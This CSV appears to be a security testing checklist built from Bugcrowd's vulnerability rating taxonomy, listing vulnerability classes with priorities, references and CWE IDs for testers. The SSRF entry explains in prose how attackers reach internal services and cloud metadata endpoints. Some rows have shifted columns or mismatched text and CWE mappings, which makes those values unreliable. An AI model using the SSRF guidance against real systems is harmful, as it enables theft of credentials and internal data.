TID,TSource,TTestName,TType,TDescription,TIssueName,TIssueType,TSeverity,TTesterSupport,TPhase,TSection,TStep,TIssueBackground,TRemediationBackground,TStdTest,TRef1,TRef2,TTRef,TCweID,TPCI,TTop10,TTop25
BCVRT-075,BCVRT,Failure to Invalidate Session: On Password Change (P4),BugCrowd Vuln Rating Taxonomy v1.3,Broken Authentication and Session Management; Failure to Invalidate Session: On Password Change,Failure to Invalidate Session: On Password Change (P4),,3,,,,75,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-077,BCVRT,Failure to Invalidate Session: On Email Change (P5),BugCrowd Vuln Rating Taxonomy v1.3,Broken Authentication and Session Management; Failure to Invalidate Session: On Email Change,Failure to Invalidate Session: On Email Change (P5),,3,,,,77,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-080,BCVRT,Weak Registration Implementation: Over HTTP (P4),BugCrowd Vuln Rating Taxonomy v1.3,Broken Authentication and Session Management; Weak Registration Implementation: Over HTTP,Weak Registration Implementation: Over HTTP (P4),,3,,,,80,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-311,,,
BCVRT-081,BCVRT,Critically Sensitive Data: Password Disclosure (P1),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; Critically Sensitive Data: Password Disclosure,Critically Sensitive Data: Password Disclosure (P1),,2,,,,81,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-522,,,
BCVRT-082,BCVRT,Critically Sensitive Data: Private API Keys (P1),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; Critically Sensitive Data: Private API Keys,Critically Sensitive Data: Private API Keys (P1),,2,,,,82,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-522,,,
BCVRT-083,BCVRT,EXIF Geolocation Data Not Stripped From Uploaded Images: Automatic User Enumeration (P3),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; EXIF Geolocation Data Not Stripped From Uploaded Images: Automatic User Enumeration,EXIF Geolocation Data Not Stripped From Uploaded Images: Automatic User Enumeration (P3),,2,,,,83,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-084,BCVRT,EXIF Geolocation Data Not Stripped From Uploaded Images: Manual User Enumeration (P4),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; EXIF Geolocation Data Not Stripped From Uploaded Images: Manual User Enumeration,EXIF Geolocation Data Not Stripped From Uploaded Images: Manual User Enumeration (P4),,3,,,,84,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-076,BCVRT,Failure to Invalidate Session: All Sessions (P5),BugCrowd Vuln Rating Taxonomy v1.3,Broken Authentication and Session Management; Failure to Invalidate Session: All Sessions,Failure to Invalidate Session: All Sessions (P5),,3,,,,76,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-079,BCVRT,Concurrent Logins (P5),BugCrowd Vuln Rating Taxonomy v1.3,Broken Authentication and Session Management; Concurrent Logins,Concurrent Logins (P5),,3,,,,79,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-1018,,,
BCVRT-087,BCVRT,Visible Detailed Error/Debug Page: Descriptive Stack Trace (P5),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; Visible Detailed Error/Debug Page: Descriptive Stack Trace,Visible Detailed Error/Debug Page: Descriptive Stack Trace (P5),,3,,,,87,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-088,BCVRT,Disclosure of Known Public Information (P5),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; Disclosure of Known Public Information,Disclosure of Known Public Information (P5),,3,,,,88,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-200,,,
BCVRT-078,BCVRT,Failure to Invalidate Session: Long Timeout (P5),BugCrowd Vuln Rating Taxonomy v1.3,Broken Authentication and Session Management; Failure to Invalidate Session: Long Timeout,Failure to Invalidate Session: Long Timeout (P5),,3,,,,78,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-085,BCVRT,Visible Detailed Error/Debug Page: Detailed Server Configuration (P4),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; Visible Detailed Error/Debug Page: Detailed Server Configuration,Visible Detailed Error/Debug Page: Detailed Server Configuration (P4),,3,,,,85,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-086,BCVRT,Visible Detailed Error/Debug Page: Full Path Disclosure (P5),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; Visible Detailed Error/Debug Page: Full Path Disclosure,Visible Detailed Error/Debug Page: Full Path Disclosure (P5),,3,,,,86,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-089,BCVRT,Token Leakage via Referer: Trusted 3rd Party (P5),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; Token Leakage via Referer: Trusted 3rd Party,Token Leakage via Referer: Trusted 3rd Party (P5),,3,,,,89,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-090,BCVRT,Token Leakage via Referer: Untrusted 3rd Party (P4),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; Token Leakage via Referer: Untrusted 3rd Party,Token Leakage via Referer: Untrusted 3rd Party (P4),,3,,,,90,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-091,BCVRT,Token Leakage via Referer: Over HTTP (P4),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; Token Leakage via Referer: Over HTTP,Token Leakage via Referer: Over HTTP (P4),,3,,,,91,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-311,,,
BCVRT-093,BCVRT,Non-Sensitive Token in URL (P5),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; Non-Sensitive Token in URL,Non-Sensitive Token in URL (P5),,3,,,,93,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-200,,,
BCVRT-094,BCVRT,Weak Password Reset Implementation: Password Reset Token Sent Over HTTP (P4),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; Weak Password Reset Implementation: Password Reset Token Sent Over HTTP,Weak Password Reset Implementation: Password Reset Token Sent Over HTTP (P4),,3,,,,94,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-092,BCVRT,Sensitive Token in URL (P4),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; Sensitive Token in URL,Sensitive Token in URL (P4),,3,,,,92,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-200,,,
BCVRT-095,BCVRT,Mixed Content (HTTPS Sourcing HTTP) (P5),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; Mixed Content (HTTPS Sourcing HTTP),Mixed Content (HTTPS Sourcing HTTP) (P5),,3,,,,95,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-098,BCVRT,Internal IP Disclosure (P5),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; Internal IP Disclosure,Internal IP and system information disclosure (phpinfo),,2,,,,98,Weaknesses in this category are typically introduced during the configuration of the software.,,,https://www.tenable.com/plugins/nnm/4666,https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed,,200,,,
BCVRT-099,BCVRT,Cross Site Script Inclusion (XSSI),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; Cross Site Script Inclusion (XSSI),Cross Site Script Inclusion (XSSI),,2,,,,99,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-100,BCVRT,JSON Hijacking (P5),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; JSON Hijacking,JSON Hijacking (P5),,3,,,,100,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-101,BCVRT,Stored: Non-Admin to Anyone (P2),BugCrowd Vuln Rating Taxonomy v1.3,Cross-Site Scripting (XSS); Stored: Non-Admin to Anyone,Stored: Non-Admin to Anyone (P2),,2,,,,101,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-102,BCVRT,Stored: Admin to Anyone (P3),BugCrowd Vuln Rating Taxonomy v1.3,Cross-Site Scripting (XSS); Stored: Admin to Anyone,Stored: Admin to Anyone (P3),,2,,,,102,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-103,BCVRT,Stored: Self (P5),BugCrowd Vuln Rating Taxonomy v1.3,Cross-Site Scripting (XSS); Stored: Self,Stored: Self (P5),,3,,,,103,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-096,BCVRT,Sensitive Data Hardcoded: OAuth Secret (P5),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; Sensitive Data Hardcoded: OAuth Secret,Sensitive Data Hardcoded: OAuth Secret (P5),,3,,,,96,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-097,BCVRT,Sensitive Data Hardcoded: File Paths (P5),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; Sensitive Data Hardcoded: File Paths,Sensitive Data Hardcoded: File Paths (P5),,3,,,,97,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-107,BCVRT,IE-Only: Older Version (IE 10/11) (P4),BugCrowd Vuln Rating Taxonomy v1.3,Cross-Site Scripting (XSS); IE-Only: Older Version (IE 10/11),IE-Only: Older Version (IE 10/11) (P4),,3,,,,107,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-108,BCVRT,IE-Only: XSS Filter Disabled (P5),BugCrowd Vuln Rating Taxonomy v1.3,Cross-Site Scripting (XSS); IE-Only: XSS Filter Disabled,IE-Only: XSS Filter Disabled (P5),,3,,,,108,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-109,BCVRT,IE-Only: Older Version (< IE10) (P5),BugCrowd Vuln Rating Taxonomy v1.3,Cross-Site Scripting (XSS); IE-Only: Older Version (< IE10),IE-Only: Older Version (< IE10) (P5),,3,,,,109,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-110,BCVRT,Referer (P4),BugCrowd Vuln Rating Taxonomy v1.3,Cross-Site Scripting (XSS); Referer,Referer (P4),,3,,,,110,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-111,BCVRT,TRACE Method (P5),BugCrowd Vuln Rating Taxonomy v1.3,Cross-Site Scripting (XSS); TRACE Method,TRACE method is enabled,,1,,,,111,,"PHASE:Implementation
DESCRIPTION:Do not leave debug statements that could be executed in the source code. Assure that all debug information is eradicated before releasing the software.

PHASE:Architecture and Design
STRATEGY:Separation of Privilege
DESCRIPTION:Compartmentalize the system to have safe areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area. Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges.",,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,215,,,
BCVRT-112,BCVRT,Universal (UXSS) (P4),BugCrowd Vuln Rating Taxonomy v1.3,Cross-Site Scripting (XSS); Universal (UXSS),Universal (UXSS) (P4),,3,,,,112,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-113,BCVRT,Off-Domain: Data URI (P4),BugCrowd Vuln Rating Taxonomy v1.3,Cross-Site Scripting (XSS); Off-Domain: Data URI,Off-Domain: Data URI (P4),,3,,,,113,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-114,BCVRT,Insecure Direct Object References (IDOR),BugCrowd Vuln Rating Taxonomy v1.3,Broken Access Control (BAC); Insecure Direct Object References (IDOR),Insecure Direct Object References (IDOR),,2,,,,114,,,,https://github.com/jhaddix/tbhm/blob/master/09_Privledge_Logic_Transport.md#Insecure-direct-objet-references,https://github.com/bugcrowd/vulnerability-rating-taxonomy,https://www.owasp.org/index.php/Testing_for_Insecure_Direct_Object_References_(OTG-AUTHZ-004),CWE-932,,,
BCVRT-104,BCVRT,Reflected: Non-Self (P3),BugCrowd Vuln Rating Taxonomy v1.3,Cross-Site Scripting (XSS); Reflected: Non-Self,Reflected: Non-Self (P3),,2,,,,104,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-105,BCVRT,Reflected: Self (P5),BugCrowd Vuln Rating Taxonomy v1.3,Cross-Site Scripting (XSS); Reflected: Self,Reflected: Self (P5),,3,,,,105,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-106,BCVRT,Cookie-Based (P5),BugCrowd Vuln Rating Taxonomy v1.3,Cross-Site Scripting (XSS); Cookie-Based,Cookie-Based (P5),,3,,,,106,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-115,BCVRT,Server-Side Request Forgery (SSRF): Internal (P2),BugCrowd Vuln Rating Taxonomy v1.3,Broken Access Control (BAC); Server-Side Request Forgery (SSRF): Internal,Server-Side Request Forgery (SSRF): Internal (P2),,2,"Overview
In a Server-Side Request Forgery (SSRF) attack, the attacker can abuse functionality on the server to read or update internal resources. The attacker can supply or a modify a URL which the code running on the server will read or submit data to, and by carefully selecting the URLs, the attacker may be able to read server configuration such as AWS metadata, connect to internal services like http enabled databases or perform post requests towards internal services which are not intended to be exposed.

Description
The target application may have functionality for importing data from a URL, publishing data to a URL or otherwise reading data from a URL that can be tampered with. The attacker modifies the calls to this functionality by supplying a completely different URL or by manipulating how URLs are built (path traversal etc.).

When the manipulated request goes to the server, the server-side code picks up the manipulated URL and tries to read data to the manipulated URL. By selecting target URLs the attacker may be able to read data from services that are not directly exposed on the internet:

Cloud server meta-data - Cloud services such as AWS provide a REST interface on http://169.254.169.254/ where important configuration and sometimes even authentication keys can be extracted
Database HTTP interfaces - NoSQL database such as MongoDB provide REST interfaces on HTTP ports. If the database is expected to only be available to internally, authentication may be disabled and the attacker can extract data
Internal REST interfaces
Files - The attacker may be able to read files using file:// URIs
The attacker may also use this functionality to import untrusted data into code that expects to only read data from trusted sources, and as such circumvent input validation.",,,115,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-116,BCVRT,Server-Side Request Forgery (SSRF): External (P4),BugCrowd Vuln Rating Taxonomy v1.3,Broken Access Control (BAC); Server-Side Request Forgery (SSRF): External,Server-Side Request Forgery (SSRF): External (P4),,3,,,,116,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-117,BCVRT,Username Enumeration: Data Leak (P4),BugCrowd Vuln Rating Taxonomy v1.3,Broken Access Control (BAC); Username Enumeration: Data Leak,Username Enumeration: Data Leak (P4),,3,,,,117,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-118,BCVRT,Exposed Sensitive Android Intent,BugCrowd Vuln Rating Taxonomy v1.3,Broken Access Control (BAC); Exposed Sensitive Android Intent,Exposed Sensitive Android Intent,,2,,,,118,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-927,,,
BCVRT-119,BCVRT,Exposed Sensitive iOS URL Scheme,BugCrowd Vuln Rating Taxonomy v1.3,Broken Access Control (BAC); Exposed Sensitive iOS URL Scheme,Exposed Sensitive iOS URL Scheme,,2,,,,119,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-939,,,
BCVRT-120,BCVRT,Application-Wide (P2),BugCrowd Vuln Rating Taxonomy v1.3,Cross-Site Request Forgery (CSRF); Application-Wide,Application-Wide (P2),,2,,,,120,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-121,BCVRT,Action-Specific: Authenticated Action,BugCrowd Vuln Rating Taxonomy v1.3,Cross-Site Request Forgery (CSRF); Action-Specific: Authenticated Action,Action-Specific: Authenticated Action,,2,,,,121,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-122,BCVRT,Action-Specific: Unauthenticated Action,BugCrowd Vuln Rating Taxonomy v1.3,Cross-Site Request Forgery (CSRF); Action-Specific: Unauthenticated Action,Action-Specific: Unauthenticated Action,,2,,,,122,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-123,BCVRT,Action-Specific: Logout (P5),BugCrowd Vuln Rating Taxonomy v1.3,Cross-Site Request Forgery (CSRF); Action-Specific: Logout,Action-Specific: Logout (P5),,3,,,,123,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
